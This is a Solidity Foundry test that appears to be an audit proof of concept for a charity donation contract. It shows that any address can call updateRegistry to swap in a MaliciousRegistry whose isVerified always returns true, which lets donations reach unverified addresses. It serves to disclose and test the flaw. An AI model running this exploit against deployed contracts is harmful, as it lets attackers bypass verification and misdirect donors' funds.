// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GivingThanks.sol";
import "../src/CharityRegistry.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "@openzeppelin/contracts/utils/Base64.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract ChangeRegistryToAttacker is Test {
    GivingThanks public charityContract;
    CharityRegistry public registryContract;
    address public admin;
    address public charity;
    address public donor;

    function setUp() public {
        // Initialize addresses
        admin = makeAddr("admin");
        charity = makeAddr("charity");
        donor = makeAddr("donor");

        // Deploy the CharityRegistry contract as admin
        vm.prank(admin);
        registryContract = new CharityRegistry();

        // Deploy the GivingThanks contract with the registry address
        vm.prank(admin);
        charityContract = new GivingThanks(address(registryContract));

        // Register and verify the charity
        vm.prank(admin);
        registryContract.registerCharity(charity);

        vm.prank(admin);
        registryContract.verifyCharity(charity);
    }

    function testChangeRegistryToAttacker() public {
        MaliciousRegistry maliciousRegistry = new MaliciousRegistry();
        address attacker = makeAddr("attacker");  

        // Change the registry address to the attacker's address  
        vm.prank(attacker);
        charityContract.updateRegistry(address(maliciousRegistry));

        // Now, the donate function will accept any address as a verified charity
        // We will create a random charity that is not even registered and donate to it.
        address newCharity = makeAddr("newCharity");

        // Fund the donor
        vm.deal(donor, 10 ether);

        // Donor donates to the charity, It goes through even though the charity is not verified
        vm.prank(donor);
        charityContract.donate{value: 10 ether}(newCharity);

        // Verify that the donation was sent to the newCharity
        uint256 charityBalance = newCharity.balance;
        assertEq(charityBalance, 10 ether);
    }
}


/**
 * @title MaliciousRegistry
 * @dev A malicious implementation of a registry contract that always returns true for verification
 * @notice This contract is designed to exploit verification systems by returning true for any address
 */

contract MaliciousRegistry {
    function isVerified(address) public pure returns (bool) {
        return true;
    }
}